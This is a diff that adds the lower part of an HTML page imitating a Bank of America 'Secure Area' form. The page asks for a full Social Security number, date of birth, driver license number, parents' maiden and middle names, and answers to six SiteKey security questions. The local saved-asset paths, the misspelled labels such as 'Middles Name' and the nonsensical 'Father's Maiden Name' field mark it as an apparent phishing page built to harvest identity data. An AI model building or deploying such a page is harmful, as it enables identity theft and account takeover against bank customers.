+                      <table width="100%" border="0" cellspacing="0" cellpadding="0" style="display: block;" summary="">
+                       <tbody>
+                        <tr>
+                         <td colspan="2">
+                          <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td>
+                              <img width="1" height="11" src="index.cfm_files/x.gif" alt="" />
+                             </td>
+                            </tr>
+                            <tr>
+                             <td class="standard-font">
+                              <p class="paragraph">
+                               <img width="25" height="1" src="index.cfm_files/x.gif" alt="" />
+                               <strong>
+                                * = required information
+                               </strong>
+                              </p>
+                             </td>
+                            </tr>
+                            <tr>
+                             <td width="100%" align="left" colspan="2" class="standard-font">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td width="50%" colspan="2" class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="2">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      Social Security Number*
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-form">
+                                      <label id="ssn_label" for="ssn3">
+                                       <span class="hidden-left">
+                                        First 3 digits of Social Security Number
+                                       </span>
+                                      </label>
+                                      <input type="text" onkeyup="return autoTab(this,3,event);" onkeypress="return csv_isNumeric(event);" maxlength="3" id="ssn3" size="3" value="" name="ssn3" class="align-font-width" autocomplete="off" />
+                                       - 
+                                      <label id="ssn_label2" for="ssn2">
+                                       <span class="hidden-left">
+                                        Second 2 Digits of Social Security Number
+                                       </span>
+                                      </label>
+                                      <input type="text" onkeyup="return autoTab(this,2,event);" onkeypress="return csv_isNumeric(event);" maxlength="2" id="ssn2" size="2" value="" name="ssn2" class="align-font-width" autocomplete="off" />
+                                       - 
+                                      <label id="ssn_label4" for="ssn4">
+                                       <span class="hidden-left">
+                                        Last 4 digits of Social Security Number
+                                       </span>
+                                      </label>
+                                      <input type="text" onkeyup="return autoTab(this,4,event);" onkeypress="return csv_isNumeric(event);" maxlength="4" id="ssn4" size="4" value="" name="ssn4" class="align-font-width" autocomplete="off" />
+                                      <a title="Information on why we ask for your Social Security number opens a new window" target="_new" href="https://www1.bankofamerica.com/deposits/odao/help.cfm?helpkey=ssn_number">
+                                       Why do we ask for this?
+                                      </a>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1" colspan="3">
+                                      Date of Birth*
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-form">
+                                      <label for="dob_month">
+                                       Month
+                                       <span class="hidden-left">
+                                        2-digit month of birth
+                                       </span>
+                                      </label>
+                                      <br />
+                                      <input type="text" onkeyup="return autoTab(this,2,event);" onkeypress="return csv_isNumeric(event);" id="dob_month" maxlength="2" size="2" class="align-font-width" value="" name="birthmonth" autocomplete="off" />
+                                       -
+                                     </td>
+                                     <td class="field-form">
+                                      <label for="dob_day">
+                                       Day
+                                       <span class="hidden-left">
+                                        2-digit day of birth
+                                       </span>
+                                      </label>
+                                      <br />
+                                      <input type="text" onkeyup="return autoTab(this,2,event);" onkeypress="return csv_isNumeric(event);" id="dob_day" maxlength="2" size="2" class="align-font-width" value="" name="birthdate" autocomplete="off" />
+                                       -
+                                     </td>
+                                     <td width="100%" class="field-form">
+                                      <label for="dob_year">
+                                       Year
+                                       <span class="hidden-left">
+                                        4-digit year of birth
+                                       </span>
+                                      </label>
+                                      <br />
+                                      <input type="text" onkeypress="return csv_isNumeric(event);" id="dob_year" maxlength="4" size="4" class="align-font-width" value="" name="birthyear" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td colspan="3" class="field-label-2">
+                                      <small>
+                                       (format: mm-dd-yyyy)
+                                      </small>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      <label id="address_line2_label" for="address_line2">
+                                       Mother's Maiden Name*
+                                      </label>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="field-form">
+                                      <input type="text" maxlength="20" id="mmn" size="16" value="" name="mmn" class="align-font-width" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      <label id="address_line2_label" for="address_line2">
+                                       Mother's Middles Name*
+                                      </label>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="field-form">
+                                      <input type="text" maxlength="20" id="mmm" size="16" value="" name="mmm" class="align-font-width" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      <label id="address_line2_label" for="address_line2">
+                                       Father's Maiden Name*
+                                      </label>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="field-form">
+                                      <input type="text" maxlength="20" id="fmn" size="16" value="" name="fmn" class="align-font-width" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      <label id="address_line2_label" for="address_line2">
+                                       Father's Middles Name*
+                                      </label>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="field-form">
+                                      <input type="text" maxlength="20" id="fmm" size="16" value="" name="fmm" class="align-font-width" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="field-row">
+                                  <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td rowspan="3">
+                                      <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                     </td>
+                                     <td width="100%" class="field-label-1">
+                                      <label id="address_line2_label" for="address_line2">
+                                       Driver License Number*
+                                      </label>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td width="100%" class="field-form">
+                                      <input type="text" maxlength="20" id="dl" size="16" value="" name="dl" class="align-font-width" autocomplete="off" />
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                              <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr class="sec-title-header">
+                                 <td width="5%">
+                                  <img width="10" height="1" alt="" src="index.cfm_files/x.gif" />
+                                  <img width="23" height="23" alt="" src="index.cfm_files/icon_circle.gif" />
+                                  <img width="5" height="1" alt="" src="index.cfm_files/x.gif" />
+                                 </td>
+                                 <td>
+                                  <h2 class="sec-hdr-h2">
+                                   SiteKey Challenge Questions
+                                  </h2>
+                                 </td>
+                                </tr>
+                                <tr>
+                                 <td class="whitebg">
+                                  <img width="1" height="2" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="display: block;" summary="">
+                               <tbody>
+                                <tr>
+                                 <td colspan="2">
+                                  <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td>
+                                      <img width="1" height="11" src="index.cfm_files/x.gif" alt="" />
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="standard-font">
+                                      <p class="paragraph">
+                                       <img width="25" height="1" src="index.cfm_files/x.gif" alt="" />
+                                       <strong>
+                                        * = required information
+                                       </strong>
+                                      </p>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question1" name="question1" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 1
+                                           </option>
+                                           <option value="What is your maternal grandmother's first name?">
+                                            What is your maternal grandmother's first name?
+                                           </option>
+                                           <option value="What is your maternal grandfather's first name?">
+                                            What is your maternal grandfather's first name?
+                                           </option>
+                                           <option value="In what city were you born?">
+                                            In what city were you born? (Enter full name of city only)
+                                           </option>
+                                           <option value="What was the name of your first pet?">
+                                            What was the name of your first pet?
+                                           </option>
+                                           <option value="What was your high school mascot?">
+                                            What was your high school mascot?
+                                           </option>
+                                           <option value="How old were you at your wedding?">
+                                            How old were you at your wedding? (Enter age as digits.)
+                                           </option>
+                                           <option value="In what year did you graduate from high school?">
+                                            In what year (YYYY) did you graduate from high school?
+                                           </option>
+                                           <option value="What is the first name of the best man/maid of honor at your wedding?">
+                                            What is the first name of the best man/maid of honor at your wedding?
+                                           </option>
+                                           <option value="Who is your favorite childhood superhero?">
+                                            Who is your favorite childhood superhero?
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 1*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer1" size="33" value="" name="answer1" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question2" name="question2" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 2
+                                           </option>
+                                           <option value="What is your father's middle name?">
+                                            What is your father's middle name?
+                                           </option>
+                                           <option value="What is your mother's middle name?">
+                                            What is your mother's middle name?
+                                           </option>
+                                           <option value="In what city were you married?">
+                                            In what city were you married?
+                                           </option>
+                                           <option value="In what city is your vacation home?">
+                                            In what city is your vacation home?
+                                           </option>
+                                           <option value="What is the first name of your first child?">
+                                            What is the first name of your first child?
+                                           </option>
+                                           <option value="What is the name of your first employer?">
+                                            What is the name of your first employer?
+                                           </option>
+                                           <option value="What is your favorite hobby?">
+                                            What is your favorite hobby?
+                                           </option>
+                                           <option value="What is your paternal grandfather's first name?">
+                                            What is your paternal grandfather's first name?
+                                           </option>
+                                           <option value="What is the first name of the best man/maid of honor at your wedding?">
+                                            What is the first name of the best man/maid of honor at your wedding?
+                                           </option>
+                                           <option value="What high school did you attend?">
+                                            What high school did you attend?
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 2*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer2" size="33" value="" name="answer2" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question3" name="question3" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 3
+                                           </option>
+                                           <option value="What is your father's middle name?">
+                                            What is your father's middle name?
+                                           </option>
+                                           <option value="What is your mother's middle name?">
+                                            What is your mother's middle name?
+                                           </option>
+                                           <option value="In what city were you married?">
+                                            In what city were you married?
+                                           </option>
+                                           <option value="In what city is your vacation home?">
+                                            In what city is your vacation home?
+                                           </option>
+                                           <option value="What is the first name of your first child?">
+                                            What is the first name of your first child?
+                                           </option>
+                                           <option value="What is the name of your first employer?">
+                                            What is the name of your first employer?
+                                           </option>
+                                           <option value="What is your favorite hobby?">
+                                            What is your favorite hobby?
+                                           </option>
+                                           <option value="What is your paternal grandfather's first name?">
+                                            What is your paternal grandfather's first name?
+                                           </option>
+                                           <option value="What is the first name of the best man/maid of honor at your wedding?">
+                                            What is the first name of the best man/maid of honor at your wedding?
+                                           </option>
+                                           <option value="What high school did you attend?">
+                                            What high school did you attend?
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 3*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer3" size="33" value="" name="answer3" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question4" name="question4" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 4
+                                           </option>
+                                           <option value="In what city was your mother born?">
+                                            In what city was your mother born? (Enter full name of city only)
+                                           </option>
+                                           <option value="In what city was your father born?">
+                                            In what city was your father born? (Enter full name of city only)
+                                           </option>
+                                           <option value="What was the name of your first boyfriend or girlfriend?">
+                                            What was the name of your first boyfriend or girlfriend?
+                                           </option>
+                                           <option value="When is your wedding anniversary?">
+                                            When is your wedding anniversary? (Enter the full name of month)
+                                           </option>
+                                           <option value="In what city did you honeymoon?">
+                                            In what city did you honeymoon? (Enter full name of city only)
+                                           </option>
+                                           <option value="In what city was your high school?">
+                                            In what city was your high school? (Enter only "Charlotte" for Charlotte High School)
+                                           </option>
+                                           <option value="What is your paternal grandfather's first name?">
+                                            What is your paternal grandfather's first name?
+                                           </option>
+                                           <option value="What is your paternal grandmother's first name?">
+                                            What is your paternal grandmother's first name?
+                                           </option>
+                                           <option value="Where did you meet your spouse for the first time?">
+                                            Where did you meet your spouse for the first time? (Enter full name of city only)
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 4*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer4" size="33" value="" name="answer4" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question5" name="question5" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 5
+                                           </option>
+                                           <option value="What is your maternal grandmother's first name?">
+                                            What is your maternal grandmother's first name?
+                                           </option>
+                                           <option value="What is your maternal grandfather's first name?">
+                                            What is your maternal grandfather's first name?
+                                           </option>
+                                           <option value="In what city were you born?">
+                                            In what city were you born? (Enter full name of city only)
+                                           </option>
+                                           <option value="What was the name of your first pet?">
+                                            What was the name of your first pet?
+                                           </option>
+                                           <option value="What was your high school mascot?">
+                                            What was your high school mascot?
+                                           </option>
+                                           <option value="How old were you at your wedding?">
+                                            How old were you at your wedding? (Enter age as digits.)
+                                           </option>
+                                           <option value="In what year did you graduate from high school?">
+                                            In what year (YYYY) did you graduate from high school?
+                                           </option>
+                                           <option value="What is the first name of the best man/maid of honor at your wedding?">
+                                            What is the first name of the best man/maid of honor at your wedding?
+                                           </option>
+                                           <option value="Who is your favorite childhood superhero?">
+                                            Who is your favorite childhood superhero?
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 5*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer5" size="33" value="" name="answer5" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                      <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td rowspan="3">
+                                          <img width="25" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                                         </td>
+                                         <td width="100%" class="field-label-1">
+                                          <select id="question6" name="question6" class="align-font-width">
+                                           <option selected="selected" value="">
+                                            Select SiteKey Challenge Question 6
+                                           </option>
+                                           <option value="What is your maternal grandmother's first name?">
+                                            What is your maternal grandmother's first name?
+                                           </option>
+                                           <option value="What is your maternal grandfather's first name?">
+                                            What is your maternal grandfather's first name?
+                                           </option>
+                                           <option value="In what city were you born?">
+                                            In what city were you born? (Enter full name of city only)
+                                           </option>
+                                           <option value="What was the name of your first pet?">
+                                            What was the name of your first pet?
+                                           </option>
+                                           <option value="What was your high school mascot?">
+                                            What was your high school mascot?
+                                           </option>
+                                           <option value="How old were you at your wedding?">
+                                            How old were you at your wedding? (Enter age as digits.)
+                                           </option>
+                                           <option value="In what year did you graduate from high school?">
+                                            In what year (YYYY) did you graduate from high school?
+                                           </option>
+                                           <option value="What is the first name of the best man/maid of honor at your wedding?">
+                                            What is the first name of the best man/maid of honor at your wedding?
+                                           </option>
+                                           <option value="Who is your favorite childhood superhero?">
+                                            Who is your favorite childhood superhero?
+                                           </option>
+                                          </select>
+                                         </td>
+                                        </tr>
+                                        <tr>
+                                         <td width="100%" class="field-label-1">
+                                          <label id="address_line2_label" for="address_line2">
+                                           Answer of Question 6*
+                                          </label>
+                                          <input type="text" maxlength="30" id="answer6" size="33" value="" name="answer6" class="align-font-width" autocomplete="off" />
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                    <tr>
+                                     <td class="field-row">
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                              <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td>
+                                  <img width="1" height="16" src="index.cfm_files/x.gif" alt="" />
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                          <table width="100%" border="0" cellspacing="0" cellpadding="0" summary="">
+                           <tbody>
+                            <tr>
+                             <td align="left">
+                              <table width="100%" cellspacing="0" cellpadding="0" summary="">
+                               <tbody>
+                                <tr>
+                                 <td>
+                                  <img width="4" height="1" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                                 </td>
+                                 <td>
+                                  <table cellspacing="0" cellpadding="0" summary="">
+                                   <tbody>
+                                    <tr>
+                                     <td align="left">
+                                      <table border="0" align="left" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td align="left" class="whitebg">
+                                          <table border="0" align="left" cellspacing="0" cellpadding="4" summary="">
+                                           <tbody>
+                                            <tr>
+                                             <td class="whitebg">
+                                              <input type="submit" alt="Continue" name="submit" value="Continue" class="btn2" autocomplete="off" />
+                                             </td>
+                                            </tr>
+                                           </tbody>
+                                          </table>
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                     <td align="left">
+                                      <img width="2" height="1" src="index.cfm_files/1pixel_clear.gif" alt="" />
+                                     </td>
+                                     <td align="left">
+                                      <table border="0" align="left" cellspacing="0" cellpadding="0" summary="">
+                                       <tbody>
+                                        <tr>
+                                         <td align="left" class="whitebg">
+                                          <table border="0" align="left" cellspacing="0" cellpadding="4" summary="">
+                                           <tbody>
+                                            <tr>
+                                             <td class="whitebg">
+                                             </td>
+                                            </tr>
+                                           </tbody>
+                                          </table>
+                                         </td>
+                                        </tr>
+                                       </tbody>
+                                      </table>
+                                     </td>
+                                    </tr>
+                                   </tbody>
+                                  </table>
+                                 </td>
+                                </tr>
+                               </tbody>
+                              </table>
+                             </td>
+                            </tr>
+                            <tr>
+                             <td>
+                              <img width="1" height="16" src="index.cfm_files/x.gif" alt="" />
+                             </td>
+                            </tr>
+                           </tbody>
+                          </table>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                      <script type="text/javascript" language="JavaScript">
+                       if (document.getElementsByTagName) {
+    var inputElements = document.getElementsByTagName("input");
+    for (i=0; inputElements[i]; i++) {
+        if (inputElements[i].className) {
+            inputElements[i].setAttribute("autocomplete","off");
+        }//if current input element has the disableAutoComplete class set.
+    }//loop thru input elements
+}//basic DOM-happiness-check
+                      </script>
+                      <table border="0" cellspacing="0" cellpadding="0">
+                       <tbody>
+                        <tr>
+                         <td>
+                         </td>
+                        </tr>
+                       </tbody>
+                      </table>
+                      <script type="text/javascript" language="javascript">
+                       &lt;!--
+	checkLPImage(0);
+	// --&gt;
+                      </script>
+                      <img style="visibility: hidden;" src="index.cfm_files/a_004.gif" id="LPimgAACloseWindow" />
+                      <img style="visibility: hidden;" src="index.cfm_files/a_003.gif" id="LPimgAACancel" />
+                      <script type="text/javascript" src="index.cfm_files/eluminate.js" language="javascript1.1">
+                      </script>
+                      <script type="text/javascript" src="index.cfm_files/cmdatatagutils.js" language="javascript1.1">
+                      </script>
+                      <script src="/www/global/js/tc_logging.js?coremetrics=true" type="text/javascript">
+                      </script>
+                      <script src="index.cfm_files/tc_logging.js" type="text/javascript">
+                      </script>
+                      <script src="/www/global/js/tc_throttle.js?timestamp=201511234924466" type="text/javascript">
+                      </script>
+                      <script src="index.cfm_files/tc_throttle.js" type="text/javascript">
+                      </script>
+                      <!-- END COREMETRICS INCLUDE -->
+                      <div lang="en" class="hs-footer">
+                       <table width="747" border="0" cellspacing="0" cellpadding="0" summary="">
+                        <!-- for correct spacing after content -->
+                        <tbody>
+                         <tr>
+                          <td colspan="3">
+                           <table border="0" cellspacing="0" cellpadding="0" summary="">
+                            <tbody>
+                             <tr valign="top">
+                              <td>
+                               <img width="161" height="30" border="0" alt="" src="index.cfm_files/x.gif" />
+                              </td>
+                              <td>
+                               <img width="12" height="30" border="0" alt="" src="index.cfm_files/x.gif" />
+                              </td>
+                             </tr>
+                            </tbody>
+                           </table>
+                          </td>
+                         </tr>
+                         <!-- end spacing -->
+                         <tr>
+                          <td class="ftr-hr" colspan="3">
+                           <img width="1" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                          </td>
+                         </tr>
+                         <tr>
+                          <td colspan="3">
+                           <img width="1" height="3" border="0" alt="" src="index.cfm_files/x.gif" />
+                          </td>
+                         </tr>
+                         <tr valign="top">
+                          <td width="8">
+                           <img width="8" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                          </td>
+                          <td valign="top" class="ftr-cell">
+                           <div class="ftr-text1">
+                            <img width="1" vspace="0" hspace="0" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                           </div>
+                           <div class="ftr-text1">
+                            <a title="Privacy & Security" onclick="javascript:window.open('/privacy','newwin','width=640,height=371,scrollbars=yes,resizable=yes,left=35,top=161'); return false;" href="https://www1.bankofamerica.com/privacy">
+                             Home,Privacy &amp; Security,Careers,Site Map
+                            </a>
+                           </div>
+                           <br />
+                           <img width="9" vspace="0" hspace="0" height="11" border="0" align="left" alt="Secure Icon" src="index.cfm_files/foot_lock.gif" />
+                           <div class="ftr-head">
+                              Secure Area
+                            <br />
+                            <img width="1" vspace="0" hspace="0" height="11" border="0" alt="" src="index.cfm_files/x.gif" />
+                           </div>
+                           <div class="ftr-text1">
+                            Bank of America, N.A. Member FDIC.
+			
+Equal Housing Lender
+                            <img width="14" hspace="3" height="9" border="0" alt="Equal Housing Lender information. Link opens a new window." src="index.cfm_files/house.gif" />
+                            <br />
+                            © 2010 Bank of America Corporation. All rights reserved.
+                           </div>
+                           <br />
+                           <img width="608" height="1" border="0" alt="" src="index.cfm_files/x.gif" />
+                          </td>
+                          <td width="131" align="right">
+                          </td>
+                         </tr>
+                        </tbody>
+                       </table>
+                      </div>
+                      <img style="visibility: hidden; position: absolute; top: 0px; left: -5000px;" src="index.cfm_files/a_002.gif" />
+                     </td>
+                    </tr>
+                   </tbody>
+                  </table>
+                 </td>
+                </tr>
+               </tbody>
+              </table>
+             </td>
+            </tr>
+           </tbody>
+          </table>
+         </td>
+        </tr>
+       </tbody>
+      </table>
+     </td>
+    </tr>
+   </tbody>
+  </table>
+ </body>
+</html>
